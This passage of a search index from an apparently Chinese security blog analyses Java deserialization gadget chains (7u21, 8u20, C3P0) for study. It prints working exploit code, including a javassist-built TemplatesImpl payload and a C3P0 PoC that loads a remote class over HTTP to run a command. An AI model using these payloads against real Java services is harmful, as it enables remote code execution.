\u4e5f\u5c31\u662ftemplatesImpl.hashCode()\u3002\u6240\u4ee5\u4e5f\u5c31\u662f\u8bf4AnnotationInvocationHandler\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u88abhash\u65b9\u6cd5\u6267\u884c\u540e\u7684\u7ed3\u679c\uff0c\u5c31\u76f8\u5f53\u4e8e\u662fhash(eviltemplates) \u968f\u540e\u8fd9\u4e2a\u503c\u6765\u5230if\u5224\u65ad\u903b\u8f91\uff0c\u5b83\u904d\u5386\u4e4b\u524d\u7684\u503c\uff0c\u5e76\u5c06\u904d\u5386\u5f97\u5230\u7684\u503c\u8d4b\u7ed9var5 \u4e0a\u4e00\u4e2a\u503c\u7684hash\uff08\u4e5f\u5c31\u662feviltemplates\u7684hash\uff09\u4e0eAnnotationInvocationHandler\u5bf9\u8c61\u7684hash\uff08\u4e5f\u8fd8\u662feviltemplates\u7684hash\uff09\u76f8\u540c\uff0c\u4f46\u662fAnnotationInvocationHandler\u5bf9\u8c61\u4e0eeviltemplates\u5bf9\u8c61\u5e76\u4e0d\u76f8\u540c\uff0c\u6240\u4ee5\u4fbf\u89e6\u52a8\u4e86equals\uff0c\u4ee3\u7801\u6267\u884c\u6210\u529f\u3002","title":"LinkedHashSet"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#payload","text":"\u7eb5\u89c2\u4ee5\u4e0a\u4e09\u4e2a\u7c7b\uff0c\u6211\u4eec\u53ef\u4ee5\u5199\u51fapayload public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass cc = pool.makeClass(\"evilclass\"); String cmd = \"Runtime.getRuntime().exec(\\\"calc\\\");\"; CtConstructor cons = new CtConstructor(new CtClass[]{},cc); cons.setBody(\"Runtime.getRuntime().exec(\\\"calc\\\");\"); cc.addConstructor(cons); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); cc.setName(\"evilClass\"); byte[] evilbytes = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{evilbytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Class clazz = TemplatesImpl.class.newInstance().getClass(); Field[] Fields = clazz.getDeclaredFields(); for (Field Field : Fields) { //\u904d\u5386Fields\u6570\u7ec4 try { //\u6267\u884cget()\u65b9\u6cd5\u65f6\u9700\u629b\u51faIllegalAccessException\u9519\u8bef Field.setAccessible(true); //\u5bf9\u6570\u7ec4\u4e2d\u7684\u6bcf\u4e00\u9879\u5b9e\u73b0\u79c1\u6709\u8bbf\u95ee if(Field.getName()==\"_bytecodes\"){ Field.set(templates,targetByteCodes); } if(Field.getName()==\"_class\"){ Field.set(templates,null); } if(Field.getName()==\"_name\"){ Field.set(templates,\"abc\"); } if(Field.getName()==\"_tfactory\"){ Field.set(templates,new TemplatesImpl()); } } catch (Exception e) {} } Map map = new HashMap(); String magicStr = \"f5a5a608\"; final Constructor<?> ctor = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\").getDeclaredConstructors()[0]; ctor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class, map); Object proxy = Proxy.newProxyInstance(null, Object.class.getInterfaces(), invocationHandler); HashSet target = new LinkedHashSet(); target.add(templates); target.add(proxy); //\u8fd9\u4e2amap\u9700\u8981\u5728Hashmap put\u4e86proxy\u540e\u518d\u8d4b\u503c\uff0c\u4e0d\u7136\u4f1a\u62a5\u9519\uff08\u6211\u4e5f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48 map.put(magicStr, templates); // \u5e8f\u5217\u5316 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename)); oos.writeObject(target); // \u53cd\u5e8f\u5217\u5316 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); ois.readObject(); \u770b\u4e00\u4e0b\u8c03\u7528\u6808 \u66f4\u76f4\u89c2\u7684\u8c03\u7528\u94fe LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... // TemplatesImpl.getOutputProperties()\uff0c\u5b9e\u9645\u6d4b\u8bd5\u65f6\u4f1a\u76f4\u63a5\u8c03\u7528 newTransformer() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.<clinit>() ... Runtime.exec()","title":"\u5b8c\u6574payload"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#_4","text":"\u76f4\u63a5\u5ad6\u4f1f\u795e@F4DE\u7684\u603b\u7ed3\uff0c\u4ed6\u603b\u7ed3\u7684\u592a\u597d\u4e86 \u6240\u4ee5\uff0c\u6574\u4e2a\u5229\u7528\u7684\u8fc7\u7a0b\u5c31\u6e05\u6670\u4e86\uff0c\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u6765\u6784\u9020\uff1a \u9996\u5148\u751f\u6210\u6076\u610f TemplateImpl \u5bf9\u8c61 \u5b9e\u4f8b\u5316 AnnotationInvocationHandler \u5bf9\u8c61 \u5b83\u7684type\u5c5e\u6027\u662f\u4e00\u4e2a Templates \u7c7b \u5b83\u7684 memberValues \u5c5e\u6027\u662f\u4e00\u4e2a Map \uff0c Map \u53ea\u6709\u4e00\u4e2akey\u548cvalue\uff0ckey\u662f\u5b57\u7b26\u4e32 f5a5a608 \uff0c value\u662f\u524d\u9762\u751f\u6210\u7684\u6076\u610f TemplateImpl \u5bf9\u8c61 \u5bf9\u8fd9\u4e2a AnnotationInvocationHandler \u5bf9\u8c61\u505a\u4e00\u5c42\u4ee3\u7406\uff0c\u751f\u6210proxy\u5bf9\u8c61 \u5b9e\u4f8b\u5316\u4e00\u4e2a HashSet \uff0c\u8fd9\u4e2a HashSet \u6709\u4e24\u4e2a\u5143\u7d20\uff0c\u5206\u522b\u662f: TemplateImpl \u5bf9\u8c61 proxy \u5bf9\u8c61 \u5c06 HashSet \u5bf9\u8c61\u8fdb\u884c\u5e8f\u5217\u5316 \u8fd9\u6837\uff0c\u53cd\u5e8f\u5217\u5316\u89e6\u53d1\u4ee3\u7801\u6267\u884c\u7684\u6d41\u7a0b\u5982\u4e0b\uff1a \u89e6\u53d1 HashSet#readObject \u65b9\u6cd5\uff0c\u5176\u4e2d\u4f7f\u7528 HashMap \u7684key\u505a\u53bb\u91cd \u53bb\u91cd\u65f6\u8ba1\u7b97 HashSet \u4e2d\u7684\u4e24\u4e2a\u5143\u7d20\u7684 hashCode() \uff0c\u56e0\u4e3a\u6211\u4eec\u7684\u7cbe\u5fc3\u6784\u9020\u4e8c\u8005\u76f8\u7b49\uff0c\u8fdb\u800c\u89e6\u53d1 equals() \u65b9\u6cd5 \u8c03\u7528 AnnotationInvocationHandler#equalsImpl \u65b9\u6cd5 equalsImpl \u4e2d\u904d\u5386this.type\u7684\u6bcf\u4e2a\u65b9\u6cd5\u5e76\u8c03\u7528 \u56e0\u4e3athis.type\u662f Templates \u7c7b\uff0c\u6240\u4ee5\u89e6\u53d1\u4e86 newTransform() \u6216 getOutputProperties() \u65b9\u6cd5 \u4efb\u610f\u4ee3\u7801\u6267\u884c","title":"\u603b\u7ed3"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/7u21%E9%93%BE%E6%B5%85%E6%9E%90/7u21%E9%93%BE%E6%B5%85%E6%9E%90/#_5","text":"\u5728sun.reflect.annotation.AnnotationInvocationHandler\u7c7b\u7684readObject\u51fd\u6570\u4e2d\uff0c\u539f\u672c\u6709\u4e00\u4e2a\u5bf9this.type\u7684\u68c0\u67e5\uff0c\u5728\u5176\u4e0d\u662fAnnotationType\u7684\u60c5\u51b5\u4e0b\uff0c\u4f1a\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\u3002\u4f46\u662f\uff0c\u6355\u83b7\u5230\u5f02\u5e38\u540e\u6ca1\u6709\u505a\u4efb\u4f55\u4e8b\u60c5\uff0c\u53ea\u662f\u5c06\u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u4e86\uff0c\u8fd9\u6837\u5e76\u4e0d\u5f71\u54cd\u6574\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u6267\u884c\u8fc7\u7a0b\u3002\u5728\u65b0\u7248\u4e2d\uff0c\u5c06\u8fd9\u4e2a\u8fd4\u56de\u6539\u4e3a\u4e86\u629b\u51fa\u4e00\u4e2a\u5f02\u5e38\uff0c\u4f1a\u5bfc\u81f4\u6574\u4e2a\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u7ec8\u6b62\u3002 \u800c\u5bf9\u5b83\u7684\u7ed5\u8fc7\u5219\u662f8u20\u94fe\u7684\u6545\u4e8b\u4e86...","title":"\u5b98\u65b9\u4fee\u590d"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/","text":"8u20\u94fe\u6d45\u6790 \u76ee\u5f55 java \u53cd\u5e8f\u5217\u6d41\u751f\u6210\u673a\u5236 \u6807\u8bc6\u7b26\u548c\u6d41\u7248\u672c\u53f7 \u4e24\u4e2a\u5e38\u91cf \u7c7b\u540d\u4e0eserialVersionUID \u57287u21\u94fe\u4e2d\uff0c\u6211\u63d0\u5230\u8fc7\u5b83\u7684\u4fee\u590d\u65b9\u6cd5\u662f\u5224\u65adthis.type\u662f\u5426\u4e3aAnnotationType\uff0c\u4e0d\u662f\u5219\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u3002 8u20\u94fe\u5c31\u662f\u5bf9\u5176\u7684\u7ed5\u8fc7\u3002 java \u53cd\u5e8f\u5217\u6d41\u751f\u6210\u673a\u5236 public class A{ public int Aage = 100; protected String Aname = \"String in A\"; private boolean Aflag = true; } import java.io.Serializable; public class B extends A implements Serializable { public int age = 50; protected String name = \"String in B\"; private boolean flag = false; } import java.io.*; public class test { public static void main(String[] args) throws Exception{ B b = new B(); serialize(b,\"b.ser\"); } public static void serialize(Object object, String file) throws IOException { File f = new File(file); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(object); out.flush(); out.close(); } } \u4e0a\u56fe\u662f\u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u540e\u5f97\u5230\u7684\u5e8f\u5217\u5316\u6d41\uff0c\u6211\u4eec\u901a\u8fc7\u8c03\u8bd5\u6765\u4e00\u7aa5\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u3002 \u6807\u8bc6\u7b26\u548c\u6d41\u7248\u672c\u53f7 \u9996\u5148\u5bf9\u4ee5\u4e0b\u4ee3\u7801\u8fdb\u884c\u8ddf\u8fdb ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); \u8ddf\u8fdb\u540e\u4f1a\u53d1\u73b0\u8fd9\u91cc\u4f1a\u5411\u5e8f\u5217\u6d41\u4e2d\u5148\u5199\u5165\u4e24\u4e2a\u5e38\u91cfSTREAM_MAGIC\uff080xaced\uff09\uff0cSTREAM_VERSION\uff085\uff09\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5148\u5199\u5165\u4e00\u4e2a\u6807\u8bc6\u7b26\u4ee5\u53ca\u8fd9\u4e2a\u6d41\u7684\u7248\u672c\u53f7 \u4e24\u4e2a\u5e38\u91cf \u968f\u540e\u5411\u4e0b\u8ddf\u8fdb out.writeObject(object) \u6b64\u5904\u53c8\u5199\u5165\u4e86\u4e00\u4e2a\u5e38\u91cfTC_OBJECT\uff080x73\uff09 \u8ddf\u8fdb1427\u884c\u7684writeClassDesc\u540e\u4f1a\u6765\u5230 writeNonProxyDesc\uff0c\u53c8\u5199\u5165\u4e00\u4e2a\u5e38\u91cf TC_CLASSDESC\uff080x72\uff09 \u7c7b\u540d\u4e0eserialVersionUID \u8ddf\u8fdb1280\u884c\u7684writeNonProxy","title":"8u20\u94fe\u6d45\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/#8u20","text":"","title":"8u20\u94fe\u6d45\u6790"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/#_1","text":"java \u53cd\u5e8f\u5217\u6d41\u751f\u6210\u673a\u5236 \u6807\u8bc6\u7b26\u548c\u6d41\u7248\u672c\u53f7 \u4e24\u4e2a\u5e38\u91cf \u7c7b\u540d\u4e0eserialVersionUID \u57287u21\u94fe\u4e2d\uff0c\u6211\u63d0\u5230\u8fc7\u5b83\u7684\u4fee\u590d\u65b9\u6cd5\u662f\u5224\u65adthis.type\u662f\u5426\u4e3aAnnotationType\uff0c\u4e0d\u662f\u5219\u76f4\u63a5\u629b\u51fa\u5f02\u5e38\u3002 8u20\u94fe\u5c31\u662f\u5bf9\u5176\u7684\u7ed5\u8fc7\u3002","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/#java","text":"public class A{ public int Aage = 100; protected String Aname = \"String in A\"; private boolean Aflag = true; } import java.io.Serializable; public class B extends A implements Serializable { public int age = 50; protected String name = \"String in B\"; private boolean flag = false; } import java.io.*; public class test { public static void main(String[] args) throws Exception{ B b = new B(); serialize(b,\"b.ser\"); } public static void serialize(Object object, String file) throws IOException { File f = new File(file); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); out.writeObject(object); out.flush(); out.close(); } } \u4e0a\u56fe\u662f\u4e0a\u9762\u4ee3\u7801\u8fd0\u884c\u540e\u5f97\u5230\u7684\u5e8f\u5217\u5316\u6d41\uff0c\u6211\u4eec\u901a\u8fc7\u8c03\u8bd5\u6765\u4e00\u7aa5\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u3002","title":"java \u53cd\u5e8f\u5217\u6d41\u751f\u6210\u673a\u5236"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/#_2","text":"\u9996\u5148\u5bf9\u4ee5\u4e0b\u4ee3\u7801\u8fdb\u884c\u8ddf\u8fdb ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f)); \u8ddf\u8fdb\u540e\u4f1a\u53d1\u73b0\u8fd9\u91cc\u4f1a\u5411\u5e8f\u5217\u6d41\u4e2d\u5148\u5199\u5165\u4e24\u4e2a\u5e38\u91cfSTREAM_MAGIC\uff080xaced\uff09\uff0cSTREAM_VERSION\uff085\uff09\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u5148\u5199\u5165\u4e00\u4e2a\u6807\u8bc6\u7b26\u4ee5\u53ca\u8fd9\u4e2a\u6d41\u7684\u7248\u672c\u53f7","title":"\u6807\u8bc6\u7b26\u548c\u6d41\u7248\u672c\u53f7"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/#_3","text":"\u968f\u540e\u5411\u4e0b\u8ddf\u8fdb out.writeObject(object) \u6b64\u5904\u53c8\u5199\u5165\u4e86\u4e00\u4e2a\u5e38\u91cfTC_OBJECT\uff080x73\uff09 \u8ddf\u8fdb1427\u884c\u7684writeClassDesc\u540e\u4f1a\u6765\u5230 writeNonProxyDesc\uff0c\u53c8\u5199\u5165\u4e00\u4e2a\u5e38\u91cf TC_CLASSDESC\uff080x72\uff09","title":"\u4e24\u4e2a\u5e38\u91cf"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/8u20%E9%93%BE%E6%B5%85%E6%9E%90/8u20%E9%93%BE%E6%B5%85%E6%9E%90/#serialversionuid","text":"\u8ddf\u8fdb1280\u884c\u7684writeNonProxy","title":"\u7c7b\u540d\u4e0eserialVersionUID"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Gadget/C3P0%E9%93%BE/C3P0%E9%93%BE/","text":"C3P0\u94fe \u76ee\u5f55 C3P0\uff1f Gadget URLClassLoader POC \u603b\u7ed3 hex base POC \u603b\u7ed3 jndi POC \u603b\u7ed3 C3P0\uff1f C3P0\u662fJDBC\u7684\u4e00\u4e2a\u8fde\u63a5\u6c60\u7ec4\u4ef6 JDBC: \"JDBC\u662fJava DataBase Connectivity\u7684\u7f29\u5199\uff0c\u5b83\u662fJava\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u7684\u6807\u51c6\u63a5\u53e3\u3002 \u4f7f\u7528Java\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\u65f6\uff0cJava\u4ee3\u7801\u5e76\u4e0d\u662f\u76f4\u63a5\u901a\u8fc7TCP\u8fde\u63a5\u53bb\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u800c\u662f\u901a\u8fc7JDBC\u63a5\u53e3\u6765\u8bbf\u95ee\uff0c\u800cJDBC\u63a5\u53e3\u5219\u901a\u8fc7JDBC\u9a71\u52a8\u6765\u5b9e\u73b0\u771f\u6b63\u5bf9\u6570\u636e\u5e93\u7684\u8bbf\u95ee\u3002\" \u8fde\u63a5\u6c60\uff1a \"\u6211\u4eec\u5728\u8bb2\u591a\u7ebf\u7a0b\u7684\u65f6\u5019\u8bf4\u8fc7\uff0c\u521b\u5efa\u7ebf\u7a0b\u662f\u4e00\u4e2a\u6602\u8d35\u7684\u64cd\u4f5c\uff0c\u5982\u679c\u6709\u5927\u91cf\u7684\u5c0f\u4efb\u52a1\u9700\u8981\u6267\u884c\uff0c\u5e76\u4e14\u9891\u7e41\u5730\u521b\u5efa\u548c\u9500\u6bc1\u7ebf\u7a0b\uff0c\u5b9e\u9645\u4e0a\u4f1a\u6d88\u8017\u5927\u91cf\u7684\u7cfb\u7edf\u8d44\u6e90\uff0c\u5f80\u5f80\u521b\u5efa\u548c\u6d88\u8017\u7ebf\u7a0b\u6240\u8017\u8d39\u7684\u65f6\u95f4\u6bd4\u6267\u884c\u4efb\u52a1\u7684\u65f6\u95f4\u8fd8\u957f\uff0c\u6240\u4ee5\uff0c\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\uff0c\u53ef\u4ee5\u7528\u7ebf\u7a0b\u6c60\u3002 \u7c7b\u4f3c\u7684\uff0c\u5728\u6267\u884cJDBC\u7684\u589e\u5220\u6539\u67e5\u7684\u64cd\u4f5c\u65f6\uff0c\u5982\u679c\u6bcf\u4e00\u6b21\u64cd\u4f5c\u90fd\u6765\u4e00\u6b21\u6253\u5f00\u8fde\u63a5\uff0c\u64cd\u4f5c\uff0c\u5173\u95ed\u8fde\u63a5\uff0c\u90a3\u4e48\u521b\u5efa\u548c\u9500\u6bc1JDBC\u8fde\u63a5\u7684\u5f00\u9500\u5c31\u592a\u5927\u4e86\u3002\u4e3a\u4e86\u907f\u514d\u9891\u7e41\u5730\u521b\u5efa\u548c\u9500\u6bc1JDBC\u8fde\u63a5\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u8fde\u63a5\u6c60\uff08Connection Pool\uff09\u590d\u7528\u5df2\u7ecf\u521b\u5efa\u597d\u7684\u8fde\u63a5\u3002\" C3P0\uff1a C3P0\u662f \u4e00\u4e2a\u5f00\u6e90\u7684JDBC\u8fde\u63a5\u6c60\uff0c\u5b83\u5b9e\u73b0\u4e86\u6570\u636e\u6e90\u548cJNDI\u7ed1\u5b9a\uff0c\u652f\u6301JDBC3\u89c4\u8303\u548cJDBC2\u7684\u6807\u51c6\u6269\u5c55\u3002 \u4f7f\u7528\u5b83\u7684\u5f00\u6e90\u9879\u76ee\u6709Hibernate\u3001Spring\u7b49\u3002 Gadget C3P0\u94fe\u7684\u76f8\u5173\u4f9d\u8d56\u53ca\u7248\u672c\uff0c\u4eceysoserial\u4e2d\u53ef\u4ee5\u770b\u5230 C3P0 @mbechler c3p0:0.9.5.2, mchange-commons-java:0.2.11 pom.xml\uff0cmaven\u4e2d\u6dfb\u52a0\u6b64\u7ec4\u4ef6\u4f1a\u81ea\u52a8\u52a0\u8f7dmchange-commons-java\u8fd9\u4e2a\u5305 <dependencies> <dependency> <groupId>com.mchange</groupId> <artifactId>c3p0</artifactId> <version>0.9.5.2</version> </dependency> </dependencies> URLClassLoader \u8fd9\u6761\u94fe\u5728\u8bb8\u591a\u6587\u7ae0\u4e2d\u4e5f\u88ab\u79f0\u4e3ahttp base\u94fe\u3002 \u5728PoolBackedDataSourceBase\u7c7b\uff08\u62bd\u8c61\u7c7b\uff09\u7684writeObject\u65b9\u6cd5\u4e2d\u6709\u5982\u4e0b\u5185\u5bb9 \u8be5\u65b9\u6cd5\u4f1a\u5c1d\u8bd5\u5c06\u5f53\u524d\u5bf9\u8c61\u7684connectionPoolDataSource\u5c5e\u6027\u8fdb\u884c\u5e8f\u5217\u5316\uff0c\u5982\u679c\u4e0d\u80fd\u5e8f\u5217\u5316\u4fbf\u4f1a\u5728catch\u5757\u4e2d\u5bf9connectionPoolDataSource\u5c5e\u6027\u7528ReferenceIndirector.indirectForm\u65b9\u6cd5\u5904\u7406\u540e\u518d\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002\u6211\u4eec\u8ddf\u8fdbReferenceIndirector.indirectForm\u65b9\u6cd5\u3002 \u6b64\u65b9\u6cd5\u4f1a\u8c03\u7528connectionPoolDataSource\u5c5e\u6027\u7684getReference\u65b9\u6cd5\uff0c\u5e76\u7528\u8fd4\u56de\u7ed3\u679c\u4f5c\u4e3a\u53c2\u6570\u5b9e\u4f8b\u5316\u4e00\u4e2aReferenceSerialized\u5bf9\u8c61\uff0c\u7136\u540e\u5c06ReferenceSerialized\u5bf9\u8c61\u8fd4\u56de\uff0cReferenceSerialized\u88ab\u5e8f\u5217\u5316\u3002 \u4e0b\u56fe\u662fReferenceSerialized\u6784\u9020\u65b9\u6cd5\uff0c\u7ed3\u5408\u4e0a\u6587\u53ef\u4ee5\u53d1\u73b0\uff0c\u5176reference\u5bf9\u8c61\u662f\u4eba\u4e3a\u53ef\u63a7\u7684\u3002 \u5c3d\u7136\u8bf4\u5230\u4e86PoolBackedDataSourceBase\u7684writeObject\u65b9\u6cd5\uff0c\u6709\u5e8f\u5217\u5316\u80af\u5b9a\u5c31\u6709\u53cd\u5e8f\u5217\u5316\uff0c\u90a3\u81ea\u7136\u800c\u7136\u5230PoolBackedDataSourceBase\u7684readObject\u65b9\u6cd5\u770b\u770b\u3002 \u53ef\u4ee5\u770b\u5230\u4f1a\u8c03\u7528\u5e8f\u5217\u6d41\u4e2d\u7684\u5bf9\u8c61\u7684getObject\u65b9\u6cd5\uff0c\u7ed3\u5408\u4e0a\u6587\uff0c\u5982\u679cReferenceSerialized\u88ab\u5e8f\u5217\u5316\u5230\u4e86\u5e8f\u5217\u6d41\u4e2d\uff0c\u90a3\u4e48\u8fd9\u91cc\u53ef\u4ee5\u662fReferenceSerialized#getObject\uff0c\u6211\u4eec\u8fdb\u884c\u8ddf\u8fdb\u3002 \u8ddf\u8fdb\u540e\u53ef\u4ee5\u53d1\u73b0\u8c03\u7528\u4e86ReferenceableUtils.referenceToObject\u8fd9\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u518d\u5ea6\u8fdb\u884c\u8ddf\u8fdb \u7531\u4e8eref\u662f\u5728\u5e8f\u5217\u5316\u7684\u65f6\u5019\u53ef\u4ee5\u63a7\u5236\u7684\u53c2\u6570\uff0c\u90a3\u4e48fClassName\u81ea\u7136\u4e5f\u662f\u53ef\u4ee5\u63a7\u5236\u7684\u5c5e\u6027\u3002 \u7ed3\u5408\u4e0b\u56fe\u9ec4\u6846\u4e2d\u7684\u5185\u5bb9\u4e0d\u96be\u53d1\u73b0\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7URLClassLoader\u5b9e\u4f8b\u5316\u8fdc\u7a0b\u7c7b\uff0c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u3002 POC import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase; import com.mchange.v2.naming.ReferenceIndirector; import javax.naming.Name; import javax.naming.NamingException; import javax.naming.Reference; import javax.naming.Referenceable; import javax.sql.ConnectionPoolDataSource; import javax.sql.PooledConnection; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.rmi.Naming; import java.sql.SQLException; import java.sql.SQLFeatureNotSupportedException; import java.util.logging.Logger; public class c3p { public static void main(String[] args) throws Exception{ PoolBackedDataSourceBase a = new PoolBackedDataSourceBase(false); Class clazz = Class.forName(\"com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase\"); Field f1 = clazz.getDeclaredField(\"connectionPoolDataSource\"); //\u6b64\u7c7b\u662fPoolBackedDataSourceBase\u62bd\u8c61\u7c7b\u7684\u5b9e\u73b0 f1.setAccessible(true); f1.set(a,new evil()); ObjectOutputStream ser = new ObjectOutputStream(new FileOutputStream(new File(\"a.bin\"))); ser.writeObject(a); ser.close(); ObjectInputStream unser = new ObjectInputStream(new FileInputStream(\"a.bin\")); unser.readObject(); unser.close(); } public static class evil implements ConnectionPoolDataSource, Referenceable { public PrintWriter getLogWriter () throws SQLException {return null;} public void setLogWriter ( PrintWriter out ) throws SQLException {} public void setLoginTimeout ( int seconds ) throws SQLException {} public int getLoginTimeout () throws SQLException {return 0;} public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;} public PooledConnection getPooledConnection () throws SQLException {return null;} public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;} @Override public Reference getReference() throws NamingException { return new Reference(\"evilexp\",\"evilexp\",\"http://127.0.0.1:10099/\"); } } } public class evilexp { public evilexp() throws Exception{ Runtime.getRuntime().exec(\"calc\"); } } \u603b\u7ed3 PoolBackedDataSource\u5728\u5e8f\u5217\u5316\u65f6\u53ef\u4ee5\u5e8f\u5217\u5316\u5165\u4e00\u4e2a\u4efb\u610fReference\u7c7b\uff0c\u5728PoolBackedDataSource\u53cd\u5e8f\u5217\u5316\u65f6\u8be5Reference\u7c7b\u4e2d\u6307\u5b9a\u7684\u5bf9\u8c61\u4f1a\u88abURLClassLoader\u8fdc\u7a0b\u52a0\u8f7d\u5b9e\u4f8b\u5316\u3002 hex base \u5982\u679c\u4e0d\u51fa\u7f51\uff0c\u800c\u4e14\u662ffastjson\u6216jackson\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2aGadget\u3002 WrapperConnectionPoolDataSourceBase\u6709\u5c5e\u6027userOverridesAsString\u53ca\u5176setter\u65b9\u6cd5setuserOverridesAsString\u3002 \u8fd9\u91cc\u53ef\u4ee5\u8054\u60f3\u5230 \u63a5\u4e0b\u6765\u53ef\u80fd\u4f1a\u8c03\u7528\u4e0euserOverridesAsString\u76f8\u5173\u65b9\u6cd5 \u53ef\u4ee5\u5c1d\u8bd5\u7740\u5199\u4e2amain\u51fd\u6570\u8c03\u7528\u4e00\u4e0bsetuserOverridesAsString\u65b9\u6cd5\uff0c\u7136\u540e\u5728parseUserOverridesAsString\u6253\u4e2a\u65ad\u70b9\u8bd5\u8bd5\uff0c\u65ad\u70b9\u547d\u4e2d\u3002 \u4e3a\u4ec0\u4e48\u5728parseUserOverridesAsString\u6253\u65ad\u70b9\u5462\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u65b9\u6cd5\u4e2d\u6709\u4e0e\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\u76f8\u5173\u7684\u5b57\u773c\uff08\u9ec4\u6846\u4e2d\uff09 public static void main(String[] args) throws Exception{ a.setUserOverridesAsString(\"123\"); } 